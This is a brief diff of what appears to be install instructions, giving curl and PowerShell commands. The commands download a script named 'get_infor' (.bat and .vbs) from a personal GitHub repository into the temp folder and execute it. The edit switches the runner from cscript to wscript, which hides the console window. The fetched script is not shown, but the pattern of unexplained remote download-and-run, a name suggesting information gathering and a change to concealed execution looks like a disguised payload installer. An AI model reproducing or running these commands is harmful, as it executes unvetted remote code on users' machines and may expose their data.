@@ -8,4 +8,4 @@ curl -s -o "%TEMP%\get_infor.bat" "https://raw.githubusercontent.com/hoanggiang-
 
 ***Powershell
 
-Invoke-RestMethod -Uri "https://raw.githubusercontent.com/hoanggiang-4897/install/main/get_infor.vbs" -OutFile "$env:TEMP\get_infor.vbs"; cscript //nologo "$env:TEMP\get_infor.vbs"
+Invoke-RestMethod -Uri "https://raw.githubusercontent.com/hoanggiang-4897/install/main/get_infor.vbs" -OutFile "$env:TEMP\get_infor.vbs"; wscript //nologo "$env:TEMP\get_infor.vbs"
